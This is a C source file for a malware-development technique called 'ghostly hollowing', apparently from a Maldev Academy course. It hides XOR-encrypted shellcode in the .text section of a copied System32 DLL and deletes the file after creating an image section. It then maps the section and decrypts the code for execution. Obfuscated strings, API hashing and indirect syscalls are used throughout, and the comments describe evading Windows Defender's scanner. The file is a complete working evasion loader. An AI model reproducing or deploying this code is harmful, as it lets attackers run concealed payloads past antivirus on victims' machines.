// =============================================
// GhostHollow.c - Ghostly Hollowing (Maldev Academy 2024)
// =============================================
//
// Same end state as Phantom DLL Hollowing — a SEC_IMAGE section backed by a
// FILE_OBJECT whose contents differ from any on-disk file — but achieved
// WITHOUT NTFS transactions, so Defender's MpFilter.sys transaction-aware
// scanner (the source of the previous `transactionfile:_{GUID}...` alerts)
// is bypassed entirely.
//
// Flow:
//   1. PickSacrificialDll() chooses target from the allowlist.
//   2. CopyFileA from System32 -> %TEMP%\<dll>.
//   3. CreateFileA(GENERIC_READ|GENERIC_WRITE,
//                  FILE_SHARE_READ|FILE_SHARE_DELETE,
//                  OPEN_EXISTING,
//                  FILE_FLAG_DELETE_ON_CLOSE)
//      Marks the file for deletion when the handle closes.
//   4. SetFilePointer to .text raw offset.
//   5. XOR shellcode in place (P2-E key) + WriteFile encrypted bytes.
//   6. Restore plaintext on the heap buffer (in case Ghost fails and we
//      fall through to Phantom / ModuleStomp / NtAllocate).
//   7. NtCreateSection(SEC_IMAGE, hFile) — section keeps a kernel
//      reference to the FILE_OBJECT.
//   8. CloseHandle(hFile) — DELETE_ON_CLOSE fires, file disappears from
//      disk. Memory section survives because the FILE_OBJECT in kernel
//      still references the disk-less view.
//   9. NtMapViewOfSection -> RX in our process.
//   10. NtProtectVirtualMemory(RW), XOR-decrypt, NtProtectVirtualMemory(RX).
//
// Why this beats MpFilter's transaction-aware scanner: there is no NTFS
// transaction in the chain. The minifilter never marks this file's writes
// as belonging to a transactional view; the writes go through standard
// IRP_MJ_WRITE which Defender DOES still inspect, but (a) we write
// encrypted bytes, and (b) the file is gone by the time any deferred
// scan tries to follow up.
// =============================================

#include "Common.h"

BOOL GhostlyHollow(
    IN  PAPI_HASHING pApi,
    IN  PNTAPI_FUNC  pNtApis,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    BOOL     bSuccess = FALSE;
    HANDLE   hFile    = INVALID_HANDLE_VALUE;
    HANDLE   hSection = NULL;
    NTSTATUS STATUS   = 0;
    fnCloseHandle2 pCloseHandle = NULL;

    if (!pApi || !pNtApis || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        goto cleanup;

    // --- Resolve kernel32 base + APIs ---

    BYTE xK32[] = XSTR_KERNEL32_DLL;
    DEOBF(xK32);
    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
    if (!hK32) goto cleanup;

    BYTE xCreateFile[] = XSTR_CREATE_FILE_A;
    DEOBF(xCreateFile);
    fnCreateFileA2 pCreateFile = (fnCreateFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFile);

    BYTE xCopyFile[] = XSTR_COPY_FILE_A;
    DEOBF(xCopyFile);
    fnCopyFileA2 pCopyFile = (fnCopyFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCopyFile);

    BYTE xGetTemp[] = XSTR_GET_TEMP_PATH_A;
    DEOBF(xGetTemp);
    fnGetTempPathA2 pGetTempPath = (fnGetTempPathA2)pApi->pGetProcAddress(hK32, (LPCSTR)xGetTemp);

    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
    fnWriteFile2 pWriteFile = (fnWriteFile2)FetchExportAddress((PVOID)hK32, WriteFile_JOAAT);
    fnSetFilePointer pSetFilePointer = (fnSetFilePointer)FetchExportAddress((PVOID)hK32, SetFilePointer_JOAAT);
    pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);

    if (!pCreateFile || !pCopyFile || !pGetTempPath ||
        !pReadFile || !pWriteFile || !pSetFilePointer || !pCloseHandle)
        goto cleanup;

    // --- Pick sacrificial DLL (allowlist) ---

    CHAR szChosenDll[260] = { 0 };
    CHAR szSrcPath[260]   = { 0 };

    if (!PickSacrificialDll(pApi, dwShellcodeSize, szChosenDll, szSrcPath)) {
        LOG("[!] Ghost: no allowlisted DLL fits shellcode");
        goto cleanup;
    }
    SIZE_T nDll = StrLenA(szChosenDll);
    LOG("[+] Ghost: selected DLL from allowlist");

    // --- Copy to %TEMP%\<dll> ---

    CHAR szTempPath[260] = { 0 };
    DWORD dwTempLen = pGetTempPath(sizeof(szTempPath), szTempPath);
    if (dwTempLen == 0) goto cleanup;
    MemCopy(szTempPath + dwTempLen, szChosenDll, nDll);

    if (!pCopyFile(szSrcPath, szTempPath, FALSE)) {
        LOG("[!] Ghost: CopyFileA failed");
        goto cleanup;
    }
    LOG("[+] Ghost: DLL copied to temp");

    // --- Open with FILE_FLAG_DELETE_ON_CLOSE ---
    //
    // FILE_SHARE_DELETE is required for the section creation to honour
    // delete-on-close while the section is still being created.

    hFile = pCreateFile(
        szTempPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | 0x04000000 /* FILE_FLAG_DELETE_ON_CLOSE */,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("[!] Ghost: CreateFileA(DELETE_ON_CLOSE) failed");
        goto cleanup;
    }
    LOG("[+] Ghost: file opened with DELETE_ON_CLOSE");

    // --- Read PE headers to locate .text raw offset / VA ---

    BYTE peHeader[1024];
    DWORD dwBytesRead = 0;
    if (!pReadFile(hFile, peHeader, sizeof(peHeader), &dwBytesRead, NULL))
        goto cleanup;

    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeadersBounded(peHeader, dwBytesRead, &pNt))
        goto cleanup;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    DWORD dwTextRawOffset = 0;
    DWORD dwTextRawSize   = 0;
    DWORD dwTextVA        = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwTextRawOffset = pSec[i].PointerToRawData;
            dwTextRawSize   = pSec[i].SizeOfRawData;
            dwTextVA        = pSec[i].VirtualAddress;
            break;
        }
    }
    if (dwTextRawSize < dwShellcodeSize) {
        LOG("[!] Ghost: .text too small");
        goto cleanup;
    }

    pSetFilePointer(hFile, (LONG)dwTextRawOffset, NULL, 0 /*FILE_BEGIN*/);

    // --- XOR shellcode + write encrypted to file ---

    BYTE ghostKey[] = INIT_PLACEMENT_XOR_KEY;
    XorBufferInPlace(pShellcode, dwShellcodeSize, ghostKey, PLACEMENT_XOR_KEY_LEN);

    DWORD dwWritten = 0;
    BOOL bWrote = pWriteFile(hFile, pShellcode, dwShellcodeSize, &dwWritten, NULL);

    // Restore plaintext on the source buffer in case Ghost fails and we
    // fall through. Subsequent placement paths expect plaintext shellcode.
    XorBufferInPlace(pShellcode, dwShellcodeSize, ghostKey, PLACEMENT_XOR_KEY_LEN);

    if (!bWrote || dwWritten != dwShellcodeSize) {
        LOG("[!] Ghost: WriteFile failed");
        goto cleanup;
    }
    LOG("[+] Ghost: encrypted shellcode written");

    // --- Create SEC_IMAGE section from the file handle ---

    SET_SYSCALL(pNtApis->NtCreateSection);
    STATUS = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x000F001F,     // SECTION_ALL_ACCESS
        (ULONG_PTR)0,
        (ULONG_PTR)0,
        (ULONG_PTR)PAGE_READONLY,
        (ULONG_PTR)0x01000000,     // SEC_IMAGE
        (ULONG_PTR)hFile,
        0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Ghost: NtCreateSection failed", STATUS);
        goto cleanup;
    }

    // --- Close file handle: DELETE_ON_CLOSE fires, file removed from disk.
    //     The kernel FILE_OBJECT survives because the section holds a
    //     reference, so subsequent NtMapViewOfSection still works. ---

    pCloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
    LOG("[+] Ghost: file unlinked from disk");

    // --- Map section into our process ---

    PVOID  pBase    = NULL;
    SIZE_T viewSize = 0;
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    STATUS = RunSyscall(
        (ULONG_PTR)hSection,
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pBase,
        (ULONG_PTR)0,
        (ULONG_PTR)0,
        (ULONG_PTR)0,
        (ULONG_PTR)&viewSize,
        (ULONG_PTR)1,              // ViewShare
        (ULONG_PTR)0,
        (ULONG_PTR)PAGE_READONLY,
        0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Ghost: NtMapViewOfSection failed", STATUS);
        goto cleanup;
    }

    pCloseHandle(hSection);
    hSection = NULL;

    // --- Flip RW -> decrypt -> RX/RWX ---

    PVOID  pTextAddr  = (PVOID)((PBYTE)pBase + dwTextVA);
    SIZE_T sProtSize  = (SIZE_T)dwShellcodeSize;
    ULONG  dwOldProt  = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)PAGE_READWRITE,
        (ULONG_PTR)&dwOldProt, 0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Ghost: NtProtectVirtualMemory(RW) failed", STATUS);
        goto cleanup;
    }

    {
        BYTE ghostKey2[] = INIT_PLACEMENT_XOR_KEY;
        XorBufferInPlace((PBYTE)pTextAddr, dwShellcodeSize,
                         ghostKey2, PLACEMENT_XOR_KEY_LEN);
        MemSet(ghostKey2, 0, sizeof(ghostKey2));
    }

    pTextAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    sProtSize = (SIZE_T)dwShellcodeSize;
    dwOldProt = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOldProt, 0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Ghost: NtProtectVirtualMemory(exec) failed", STATUS);
        goto cleanup;
    }

    MemSet(ghostKey, 0, sizeof(ghostKey));
    *ppExecAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    LOG("[+] Ghostly hollowing: shellcode mapped + decrypted, file unlinked");
    bSuccess = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE && pCloseHandle)
        pCloseHandle(hFile);
    if (hSection != NULL && pCloseHandle)
        pCloseHandle(hSection);
    return bSuccess;
}
